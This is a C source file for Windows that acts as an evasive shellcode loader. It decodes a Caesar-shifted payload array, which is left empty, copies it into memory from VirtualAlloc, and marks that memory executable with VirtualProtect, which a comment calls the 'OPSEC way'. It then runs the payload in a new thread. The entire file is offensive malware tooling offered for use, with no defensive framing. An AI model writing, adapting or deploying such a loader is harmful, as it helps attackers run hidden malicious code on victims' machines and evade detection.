#include "windows.h"

//encrypted shellcode payload you can  refer to the shellcode_encrypters folder to find the encryption routine.
unsigned char payload[] = { };
//De caesar function to decrypt the payload before copying it to memory
void Decaesar()
{
	for (int i = 0; i < sizeof(payload); i++)
	{
		payload[i] = ((payload[i] - 2) & 0xFF);
	}
}

int main(void)
{
	
	BOOL Vp;
	HANDLE th;
	DWORD oldprotect = 0;

	// Allocate a memory buffer for payload
	PVOID exec_mem = VirtualAlloc(0, sizeof payload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	Decaesar();
	// Copy payload to new buffer
	memcpy(exec_mem, payload, sizeof payload);

	// Make new buffer as executable OPSEC way
	Vp = VirtualProtect(exec_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);

	// If all good, run the payload
    //create a thread and then we wait until we the payload will be executed
    //else will fail
	if (Vp != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, INFINITE);
	}

	return 0;


}